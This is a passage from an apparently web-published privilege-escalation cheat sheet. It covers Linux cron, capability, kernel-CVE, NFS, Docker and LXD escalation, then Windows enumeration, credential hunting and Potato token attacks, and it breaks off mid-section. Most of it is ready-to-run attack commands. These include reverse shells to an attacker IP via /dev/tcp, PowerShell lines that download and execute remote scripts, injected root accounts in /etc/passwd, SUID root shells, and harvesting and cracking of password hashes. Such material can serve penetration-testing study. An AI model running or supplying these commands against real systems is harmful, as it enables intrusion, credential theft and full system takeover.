**Cron** is the Linux task scheduler that runs commands automatically at specified intervals. The system-wide cron table (`/etc/crontab`) and per-user crontabs define these scheduled tasks.

Cron becomes a privilege escalation vector when a cron job:
1. **Runs as root** (or another privileged user)
2. **Executes a script that is writable** by your user
3. **Uses relative paths** (PATH hijacking)
4. **Uses wildcards** (`*`) that can be exploited
5. **References a script in a writable directory** that doesn't exist yet

Since cron jobs run **automatically**, you only need to modify the target and **wait** for the next execution.

### Cron — Enumeration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Cron" color="blue"}
  :badge{label="Enumeration" color="orange"}
  :badge{label="Scheduled Tasks" color="red"}
::

```bash [Enumerate All Cron Jobs]
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

```bash [Find Writable Cron Scripts]
# Check if any cron-referenced scripts are writable
find /etc/cron* -writable -type f 2>/dev/null

# Monitor for cron activity in real-time
./pspy64
```

---

### Cron — Writable Script Exploitation

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Cron" color="blue"}
  :badge{label="Writable Script" color="orange"}
  :badge{label="Most Common" color="red"}
  :badge{label="Simple" color="purple"}
::

**How it works:** If a root cron job executes a script and that script has **world-writable permissions** (or writable by your group), you can inject your payload into the script. The next time cron runs it, your code executes as root.

```bash [Step 1 — Identify writable cron script]
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ... backup.sh  ← WORLD WRITABLE!
```

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell"}
  ```bash [Append reverse shell to cron script]
  echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/backup.sh
  # Wait for cron to execute...
  # Catch shell: nc -lvnp 4444
  ```
  :::

  :::tabs-item{icon="i-lucide-key-round" label="SUID Bash"}
  ```bash [Create SUID copy of bash]
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
  # Wait for cron to execute...
  /tmp/rootbash -p
  ```
  :::

  :::tabs-item{icon="i-lucide-user-plus" label="Add Sudoer"}
  ```bash [Add yourself to sudoers]
  echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /opt/scripts/backup.sh
  # Wait for cron to execute...
  sudo bash
  ```
  :::
::

---

### Cron — Wildcard Injection

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Cron" color="blue"}
  :badge{label="Wildcard" color="orange"}
  :badge{label="tar / rsync / chown" color="red"}
  :badge{label="Argument Injection" color="purple"}
::

![Wildcard](https://img.shields.io/badge/Wildcard_Injection-E67E22?style=for-the-badge)

**How wildcard injection works:** When commands like `tar`, `rsync`, or `chown` use wildcards (`*`), the shell expands `*` to **all filenames** in the current directory. If you create a file with a name that looks like a command-line flag (e.g., `--checkpoint-action=exec=sh shell.sh`), the command interprets that filename as an **argument**, not as a file to process.

This is a form of **argument injection** through the filesystem.

```bash [Step 1 — Identify wildcard usage in cron]
cat /etc/crontab
# * * * * * root cd /var/www/html && tar czf /tmp/backup.tar.gz *
```

```bash [Step 2 — Exploit tar wildcard]
cd /var/www/html

# Create the payload script
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> shell.sh
chmod +x shell.sh

# Create filenames that tar interprets as arguments
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# When cron runs: tar czf /tmp/backup.tar.gz *
# Shell expands to: tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2 ...
# tar executes shell.sh at checkpoint 1!
```

::code-collapse

```bash [Exploit — rsync wildcard]
# If cron runs: rsync -a * /backup/
touch -- '-e sh shell.sh'
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
# Wait for cron → /tmp/rootbash -p
```

```bash [Exploit — chown wildcard]
# If cron runs: chown user:group *
# Symlink + reference file
ln -s /etc/shadow shadow_link
touch -- '--reference=shadow_link'
# This changes ownership of all files to match /etc/shadow's owner
```

::

---

### Cron — PATH Hijacking

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Cron" color="blue"}
  :badge{label="PATH" color="orange"}
  :badge{label="Hijack" color="red"}
::

If `/etc/crontab` defines a `PATH` variable that includes a **writable directory** before the actual script location, and the cron command uses a **relative path**, you can place a malicious script in the earlier directory.

```bash [Exploit]
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin
# * * * * * root backup.sh   ← relative path!

# Create malicious script in first writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/backup.sh
chmod +x /home/user/backup.sh

# Wait for cron → /tmp/rootbash -p
```

---

## :icon{name="i-lucide-key-round"} Linux — Capabilities

### How Capabilities Privilege Escalation Works

Linux **capabilities** split the monolithic root privilege into distinct units. Instead of giving a binary full root access (SUID), individual capabilities can be assigned:

| Capability | Power | Exploitation |
| ---------- | ----- | ------------ |
| `cap_setuid` | Change process UID | Set UID to 0 (root) |
| `cap_setgid` | Change process GID | Set GID to 0 (root) |
| `cap_dac_override` | Bypass file permission checks | Read/write any file |
| `cap_dac_read_search` | Bypass file read permissions | Read any file |
| `cap_net_raw` | Use raw sockets | Packet sniffing |
| `cap_net_bind_service` | Bind to privileged ports | Bind to ports < 1024 |
| `cap_sys_admin` | Broad system admin privileges | Mount filesystems, etc. |

The most dangerous capability for PrivEsc is **`cap_setuid`** — it allows the binary to change its effective UID to 0 (root).

### Capabilities — Discovery and Exploitation

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Capabilities" color="blue"}
  :badge{label="cap_setuid" color="orange"}
  :badge{label="Often Overlooked" color="red"}
  :badge{label="Powerful" color="purple"}
::

```bash [Find Binaries with Capabilities]
getcap -r / 2>/dev/null

# Example output:
# /usr/bin/python3 = cap_setuid+ep         ← DANGEROUS!
# /usr/bin/ping = cap_net_raw+ep           ← normal
# /usr/bin/vim.basic = cap_dac_override+ep ← can read any file
```

::tabs
  :::tabs-item{icon="i-lucide-code" label="cap_setuid Exploits"}
  ```bash [python3 with cap_setuid]
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

  ```bash [perl with cap_setuid]
  perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
  ```

  ```bash [php with cap_setuid]
  php -r 'posix_setuid(0); system("/bin/bash");'
  ```

  ```bash [ruby with cap_setuid]
  ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
  ```

  ```bash [node with cap_setuid]
  node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
  ```
  :::

  :::tabs-item{icon="i-lucide-file" label="cap_dac Exploits"}
  ```bash [vim with cap_dac_read_search — Read any file]
  vim /etc/shadow
  vim /root/.ssh/id_rsa
  ```

  ```bash [tar with cap_dac_read_search — Archive any file]
  tar czf /tmp/shadow.tar.gz /etc/shadow
  tar xzf /tmp/shadow.tar.gz
  cat etc/shadow
  ```
  :::
::

::card-group
  ::card
  ---
  title: GTFOBins — Capabilities
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+capabilities
  target: _blank
  ---
  Binaries exploitable through Linux capabilities — with payload commands.
  ::
::

---

## :icon{name="i-lucide-cpu"} Linux — Kernel Exploits

### How Kernel Exploits Work

Kernel exploits target vulnerabilities in the **Linux kernel itself** — the core of the operating system that has unrestricted access to all hardware and memory. A successful kernel exploit gives **immediate root access** because the kernel runs at the highest privilege level (Ring 0).

These are a **last resort** because:
- They are **version-specific** — must match the exact kernel version
- They can **crash the system** (kernel panic)
- They may be **unstable** or unreliable
- They leave **forensic artifacts**

However, on well-hardened systems with no sudo misconfigurations, no SUID abuse, and no writable scripts, kernel exploits may be the **only option**.

### Kernel — Identification

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Kernel" color="blue"}
  :badge{label="Version Check" color="orange"}
  :badge{label="CVE" color="red"}
::

::warning
Kernel exploits can **crash the target system** with a kernel panic. Use only as a last resort, never on critical production systems without explicit authorization, and always verify the exact kernel version matches the exploit's requirements.
::

```bash [Identify Kernel Version]
uname -a
uname -r
cat /proc/version
lsb_release -a 2>/dev/null
```

```bash [Automated Exploit Suggestion]
# linux-exploit-suggester
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# linux-exploit-suggester-2 (Perl)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

---

### Kernel — Major CVE Exploits

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Kernel CVE" color="blue"}
  :badge{label="Root" color="orange"}
  :badge{label="Version Specific" color="red"}
  :badge{label="Last Resort" color="purple"}
::

::tabs
  :::tabs-item{icon="i-lucide-bug" label="PwnKit (2022)"}

  **CVE-2021-4034** — Polkit `pkexec` local privilege escalation. Affects **virtually all Linux distributions** with polkit installed (versions < 0.120). This is one of the most universal and reliable kernel-adjacent exploits ever discovered.

  ```bash [CVE-2021-4034 — PwnKit]
  # Check if vulnerable
  pkexec --version
  # Vulnerable: polkit < 0.120

  # Method 1: Pre-compiled (fastest)
  curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
  chmod +x PwnKit
  ./PwnKit

  # Method 2: Compile from source
  git clone https://github.com/arthepsy/CVE-2021-4034
  cd CVE-2021-4034
  make
  ./cve-2021-4034
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="DirtyPipe (2022)"}

  **CVE-2022-0847** — Overwrites data in arbitrary read-only files via the pipe page cache. Affects Linux Kernel **5.8 through 5.16.11, 5.15.25, 5.10.102**.

  ```bash [CVE-2022-0847 — DirtyPipe]
  # Check kernel version
  uname -r
  # Vulnerable: 5.8 ≤ kernel ≤ 5.16.11

  git clone https://github.com/Al1ex/CVE-2022-0847
  cd CVE-2022-0847
  gcc exploit.c -o dirtypipe
  ./dirtypipe

  # Alternative — overwrite /etc/passwd
  gcc dirtypipez.c -o dirtypipez
  ./dirtypipez
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="DirtyCow (2016)"}

  **CVE-2016-5195** — Race condition in the copy-on-write mechanism. Affects Linux Kernel **2.6.22 through 4.8.3**. One of the most famous Linux kernel vulnerabilities.

  ```bash [CVE-2016-5195 — DirtyCow]
  # Check kernel version
  uname -r
  # Vulnerable: 2.6.22 ≤ kernel ≤ 4.8.3

  # firefart variant — creates root user
  wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
  gcc -pthread dirty.c -o dirty -lcrypt
  ./dirty newpassword
  # Creates user 'firefart' with root privileges
  su firefart
  # Password: newpassword

  # cowroot variant — direct root
  wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/cowroot.c
  gcc cowroot.c -o cowroot -pthread
  ./cowroot
  ```
  :::

  :::tabs-item{icon="i-lucide-bug" label="2023-2024 CVEs"}

  **CVE-2024-1086** — Use-after-free in nf_tables (netfilter). Affects Kernel **5.14 through 6.6**.

  ```bash [CVE-2024-1086 — nf_tables]
  git clone https://github.com/Notselwyn/CVE-2024-1086
  cd CVE-2024-1086
  make
  ./exploit
  ```

  **CVE-2023-0386** — OverlayFS privilege escalation. Affects Kernel **< 6.2**.

  ```bash [CVE-2023-0386 — OverlayFS]
  git clone https://github.com/sxlmnwb/CVE-2023-0386
  cd CVE-2023-0386
  make all
  # Terminal 1:
  ./fuse ./ovlcap/lower ./gc
  # Terminal 2:
  ./exp
  ```

  **CVE-2023-32233** — Netfilter nf_tables use-after-free. Affects Kernel **< 6.3.2**.

  ```bash [CVE-2023-32233]
  git clone https://github.com/Liuk3r/CVE-2023-32233
  cd CVE-2023-32233
  make
  ./exploit
  ```
  :::
::

::card-group
  ::card
  ---
  title: linux-exploit-suggester
  icon: i-simple-icons-github
  to: https://github.com/The-Z-Labs/linux-exploit-suggester
  target: _blank
  ---
  Automated kernel exploit suggestion based on OS and kernel version.
  ::

  ::card
  ---
  title: PwnKit (CVE-2021-4034)
  icon: i-simple-icons-github
  to: https://github.com/ly4k/PwnKit
  target: _blank
  ---
  Self-contained polkit pkexec exploit — most universal Linux PrivEsc.
  ::
::

---

## :icon{name="i-lucide-hard-drive"} Linux — File System & Special Cases

### NFS — no_root_squash

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="NFS" color="blue"}
  :badge{label="no_root_squash" color="orange"}
  :badge{label="SUID Creation" color="red"}
  :badge{label="Remote Exploit" color="purple"}
::

**How it works:** NFS (Network File System) shares can be configured with `no_root_squash`, which means files created by root on the **client** retain root ownership on the **server**. Normally, NFS maps remote root to the `nobody` user (`root_squash`) for security. With `no_root_squash` disabled, you can mount the share on your attacker machine as root, create a SUID binary owned by root, and then execute it on the target.

```bash [Target — Find NFS exports]
cat /etc/exports
# /shared *(rw,no_root_squash)
# /backup *(rw,no_root_squash)

showmount -e target_ip
```

```bash [Attacker — Create SUID binary on NFS share]
# Mount the NFS share as root
mkdir /tmp/nfs
sudo mount -o rw,vers=3 target_ip:/shared /tmp/nfs

# Create SUID root binary
cat > /tmp/nfs/shell.c << 'EOF'
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
sudo gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
sudo chmod +s /tmp/nfs/shell
sudo chown root:root /tmp/nfs/shell
```

```bash [Target — Execute SUID binary]
/shared/shell
whoami
# root
```

---

### Writable /etc/passwd

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="File Permissions" color="blue"}
  :badge{label="/etc/passwd" color="orange"}
  :badge{label="Direct Root" color="red"}
  :badge{label="Rare but Instant" color="purple"}
::

If `/etc/passwd` is writable by your user (rare but devastating), you can **add a new user with UID 0** (root equivalent) directly.

```bash [Check]
ls -la /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd  ← WRITABLE!
```

```bash [Generate password hash]
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# Or use mkpasswd
mkpasswd -m sha-512 password123
```

```bash [Add root user]
# With password
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su hacker
# Password: password123

# Without password (even easier)
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

---

### Readable /etc/shadow

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="File Permissions" color="blue"}
  :badge{label="/etc/shadow" color="orange"}
  :badge{label="Hash Cracking" color="red"}
::

```bash [Check and extract]
ls -la /etc/shadow
cat /etc/shadow
# Copy the root hash line
```

```bash [Crack on attacker machine]
# Hashcat — GPU accelerated
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Docker Group Escape

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Docker" color="blue"}
  :badge{label="Container Escape" color="orange"}
  :badge{label="Instant Root" color="red"}
  :badge{label="Group Membership" color="purple"}
::

![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)

**How it works:** Membership in the `docker` group is **equivalent to root access**. Docker can mount the **entire host filesystem** inside a container where you are root. From inside the container, you can read any file, write to `/etc/passwd`, create SUID binaries, or add SSH keys — all affecting the host system.

```bash [Check group membership]
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)
```

```bash [Mount host filesystem and get root shell]
# Method 1: chroot into host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Method 2: Access specific files
docker run -v /:/hostfs -it alpine /bin/sh
cat /hostfs/etc/shadow
echo 'hacker::0:0::/root:/bin/bash' >> /hostfs/etc/passwd

# Method 3: Create SUID bash
docker run -v /:/mnt --rm -it alpine sh -c 'chroot /mnt bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"'
# Then on host:
/tmp/rootbash -p

# Method 4: Reverse shell as root
docker run -v /:/mnt --rm -it alpine sh -c 'chroot /mnt bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'
```

---

### LXD / LXC Group Escape

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="LXD" color="blue"}
  :badge{label="Container" color="orange"}
  :badge{label="Root" color="red"}
::

::code-collapse

```bash [Check]
id
# uid=1000(user) gid=1000(user) groups=1000(user),108(lxd)
```

```bash [Attacker — Build Alpine image]
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
# Transfer the resulting .tar.gz to target
```

```bash [Target — Import and exploit]
lxc image import ./alpine-v3.18-x86_64.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Inside container — host filesystem at /mnt/root
cat /mnt/root/etc/shadow
echo 'hacker::0:0::/root:/bin/bash' >> /mnt/root/etc/passwd
```

::

---

## :icon{name="i-lucide-monitor"} Windows — System Enumeration

### Identity & Privileges

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Enumeration" color="green"}
  :badge{label="Identity" color="orange"}
  :badge{label="Privileges" color="red"}
  :badge{label="First Step" color="purple"}
::

![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)

The most critical piece of Windows enumeration is `whoami /priv` — it shows your **token privileges**, which directly determine which privilege escalation techniques are available. Privileges like `SeImpersonatePrivilege`, `SeBackupPrivilege`, and `SeDebugPrivilege` each unlock specific attack paths.

```powershell [Identity]
whoami
whoami /priv
whoami /groups
whoami /all
```

```powershell [System Information]
systeminfo
hostname
ver
wmic os get caption,version,buildnumber,osarchitecture
```

```powershell [Users & Groups]
net user
net user administrator
net localgroup
net localgroup Administrators
net user /domain 2>nul
net group "Domain Admins" /domain 2>nul
net accounts
```

---

### Credential Hunting

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Credentials" color="green"}
  :badge{label="Passwords" color="orange"}
  :badge{label="Registry" color="red"}
  :badge{label="Files" color="purple"}
  :badge{label="Critical" color="neutral"}
::

Windows stores credentials in numerous locations — registry keys, configuration files, browser data, Wi-Fi profiles, unattended installation files, and PowerShell history. Systematically checking each location often reveals plaintext passwords or hashes.

::code-collapse

```powershell [Saved Credentials — cmdkey]
:: Check for saved credentials
cmdkey /list

:: If credentials found → run command as that user
runas /savecred /user:DOMAIN\admin cmd.exe
runas /savecred /user:administrator cmd.exe
```

```powershell [Registry — AutoLogon & Stored Passwords]
:: AutoLogon passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultPassword DefaultUserName"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul

:: VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password 2>nul

:: PuTTY stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul

:: SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s 2>nul
```

```powershell [Unattended Installation Files]
:: These files often contain base64-encoded passwords
type C:\unattend.xml 2>nul
type C:\Windows\Panther\unattend.xml 2>nul
type C:\Windows\Panther\Unattend\Unattend.xml 2>nul
type C:\Windows\system32\sysprep\unattend.xml 2>nul
type C:\Windows\system32\sysprep\sysprep.xml 2>nul

:: Search for password in unattend files
findstr /si "password" C:\Windows\Panther\*.xml 2>nul
```

```powershell [IIS & Web Config]
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "password connectionString"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr /i "password"
```

```powershell [SAM / SYSTEM Backup Files]
dir C:\Windows\Repair\SAM 2>nul
dir C:\Windows\Repair\SYSTEM 2>nul
dir C:\Windows\System32\config\RegBack\SAM 2>nul
dir C:\Windows\System32\config\RegBack\SYSTEM 2>nul
```

```powershell [WiFi Passwords]
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear
:: Look for "Key Content" in output
```

```powershell [PowerShell History — May Contain Passwords]
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
Get-Content (Get-PSReadlineOption).HistorySavePath 2>$null
```

```powershell [Broad File Search for Passwords]
findstr /si "password" *.txt *.ini *.config *.xml *.php *.bat *.ps1
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *.config* 2>nul
where /r C:\ *.ini *.config 2>nul
```

```powershell [DPAPI Credentials]
dir C:\Users\*\AppData\Local\Microsoft\Credentials\ 2>nul
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\ 2>nul
```

::

---

### Network & Services

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Network" color="green"}
  :badge{label="Services" color="orange"}
  :badge{label="Tasks" color="red"}
::

::tabs
  :::tabs-item{icon="i-lucide-network" label="Network"}
  ```powershell [Network Enumeration]
  ipconfig /all
  route print
  netstat -ano
  netstat -ano | findstr LISTENING
  arp -a
  ipconfig /displaydns
  netsh advfirewall show allprofiles
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Services & Tasks"}
  ```powershell [Services]
  sc queryex type=service state=all
  wmic service get name,pathname,startmode,startname
  net start
  ```

  ```powershell [Scheduled Tasks]
  schtasks /query /fo LIST /v
  schtasks /query /fo TABLE
  Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
  ```

  ```powershell [Running Processes]
  tasklist /svc
  wmic process list full
  Get-Process | Select-Object Name,Id,Path
  ```
  :::

  :::tabs-item{icon="i-lucide-hard-drive" label="Installed Software"}
  ```powershell [Installed Programs]
  wmic product get name,version
  reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName DisplayVersion"
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion

  :: Patches / Hotfixes
  wmic qfe list
  wmic qfe get HotFixID,InstalledOn
  Get-HotFix
  ```
  :::
::

---

### Automated Windows Enumeration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Automated" color="green"}
  :badge{label="winPEAS" color="orange"}
  :badge{label="PowerUp" color="red"}
  :badge{label="Seatbelt" color="purple"}
  :badge{label="Essential" color="neutral"}
::

![winPEAS](https://img.shields.io/badge/winPEAS-0078D4?style=for-the-badge) ![PowerUp](https://img.shields.io/badge/PowerUp-5391FE?style=for-the-badge) ![Seatbelt](https://img.shields.io/badge/Seatbelt-333333?style=for-the-badge)

::tabs
  :::tabs-item{icon="i-lucide-zap" label="winPEAS"}
  ```powershell [winPEAS — Best Overall]
  Download and run
  certutil -urlcache -split -f http://10.10.14.5/winPEASx64.exe C:\Windows\Temp\wp.exe
  C:\Windows\Temp\wp.exe

  Execute from SMB share (no file on disk)
  \\10.10.14.5\share\winPEASx64.exe

  PowerShell version (if .exe blocked)
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="PowerUp"}
  ```powershell [PowerUp — Service Checks]
  Load and run all checks
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')
  Invoke-AllChecks

  Save output
  . .\PowerUp.ps1
  Invoke-AllChecks | Out-File -Encoding ASCII powerup.txt

  Specific checks
  Get-UnquotedService
  Get-ModifiableServiceFile
  Get-ModifiableService
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Seatbelt / PrivescCheck"}
  ```powershell [Seatbelt — Host Survey]
  Run all checks
  \\10.10.14.5\share\Seatbelt.exe -group=all
  Seatbelt.exe -group=user
  Seatbelt.exe -group=system
  ```

  ```powershell [PrivescCheck — Modern PowerUp]
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PrivescCheck.ps1')
  Invoke-PrivescCheck
  Invoke-PrivescCheck -Extended
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Exploit Suggester"}
  ```powershell [Windows Exploit Suggester]
  On target: save systeminfo output
  systeminfo > C:\Windows\Temp\sysinfo.txt

  Transfer to attacker, then run:
  python windows-exploit-suggester.py --database 2024-mssb.xls --systeminfo sysinfo.txt
  ```

  ```powershell [Watson — C# on target]
  Modern alternative — runs directly on target
  \\10.10.14.5\share\Watson.exe
  ```

  ```powershell [Sherlock — PowerShell on target]
  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Sherlock.ps1')
  Find-AllVulns
  ```
  :::
::

::card-group
  ::card
  ---
  title: PEASS-ng (winPEAS)
  icon: i-simple-icons-github
  to: https://github.com/peass-ng/PEASS-ng
  target: _blank
  ---
  16K+ ⭐ — The most comprehensive automated Windows privilege escalation enumeration.
  ::

  ::card
  ---
  title: PowerUp (PowerSploit)
  icon: i-simple-icons-github
  to: https://github.com/PowerShellMafia/PowerSploit
  target: _blank
  ---
  12K+ ⭐ — PowerShell-based Windows PrivEsc checks — service misconfigs, DLL hijacks, registry.
  ::

  ::card
  ---
  title: PrivescCheck
  icon: i-simple-icons-github
  to: https://github.com/itm4n/PrivescCheck
  target: _blank
  ---
  3K+ ⭐ — Modern PowerShell privilege escalation checker — successor to PowerUp.
  ::

  ::card
  ---
  title: Seatbelt (GhostPack)
  icon: i-simple-icons-github
  to: https://github.com/GhostPack/Seatbelt
  target: _blank
  ---
  3.5K+ ⭐ — C# security-oriented host survey for Windows environments.
  ::

  ::card
  ---
  title: Watson
  icon: i-simple-icons-github
  to: https://github.com/rasta-mouse/Watson
  target: _blank
  ---
  Enumerate missing KBs and suggest CVEs — modern Sherlock alternative in C#.
  ::
::

---

## :icon{name="i-lucide-shield-alert"} Windows — Token & Privilege Abuse

### How Windows Token Privilege Escalation Works

Windows uses **access tokens** to control what a process can do. Each token contains a list of **privileges** — capabilities like "impersonate a client", "load a kernel driver", or "debug any process".

Certain privileges are **extremely dangerous** when enabled because they allow actions that can lead directly to SYSTEM-level access. The most commonly exploited are the **impersonation privileges** (`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`), which are granted by default to **service accounts** like IIS (`iis apppool\defaultapppool`), MSSQL (`NT SERVICE\MSSQL`), and Network Service.

The entire family of **"Potato" attacks** exploit these impersonation privileges to escalate from a service account to `NT AUTHORITY\SYSTEM`.

### Token — Check Privileges

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Token" color="green"}
  :badge{label="Privileges" color="orange"}
  :badge{label="First Check" color="red"}
::

```powershell [Check Current Privileges]
whoami /priv

:: CRITICAL privileges to look for:
:: SeImpersonatePrivilege           → Potato attacks → SYSTEM
:: SeAssignPrimaryTokenPrivilege    → Potato attacks → SYSTEM
:: SeBackupPrivilege                → Read ANY file (SAM/SYSTEM)
:: SeRestorePrivilege               → Write ANY file
:: SeTakeOwnershipPrivilege         → Own ANY file
:: SeDebugPrivilege                 → Dump LSASS, inject into processes
:: SeLoadDriverPrivilege            → Load malicious kernel drivers
```

---

### Potato Attacks — SeImpersonatePrivilege

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Token" color="green"}
  :badge{label="SeImpersonate" color="orange"}
  :badge{label="Potato" color="red"}
  :badge{label="Service → SYSTEM" color="purple"}
  :badge{label="Most Common Windows PrivEsc" color="neutral"}
::

![Potato](https://img.shields.io/badge/Potato_Attacks-DC382D?style=for-the-badge)

**How Potato attacks work:** These exploits trick a **SYSTEM-level Windows process** into authenticating (connecting) to a listener controlled by the attacker. Because the attacker's process has `SeImpersonatePrivilege`, it can **impersonate the SYSTEM token** from that authentication, effectively becoming SYSTEM.

Different Potato variants use different techniques to trigger the SYSTEM authentication:
- **JuicyPotato** — abuses COM servers (DCOM/BITS)
- **PrintSpoofer** — abuses the Print Spooler named pipe
- **GodPotato** — abuses DCOM with improved compatibility
- **RoguePotato** — remote OXID resolution for newer Windows
- **SweetPotato** — combines multiple techniques

::tabs
  :::tabs-item{icon="i-lucide-crown" label="GodPotato"}

  **Works on:** Windows Server 2012 – 2022, Windows 8 – 11. The most **universal** potato exploit with no CLSID guessing required.

  ```powershell [GodPotato]
  Verify privilege
  whoami /priv | findstr "SeImpersonate"

  Execute command as SYSTEM
  GodPotato.exe -cmd "cmd /c whoami"

  Reverse shell as SYSTEM
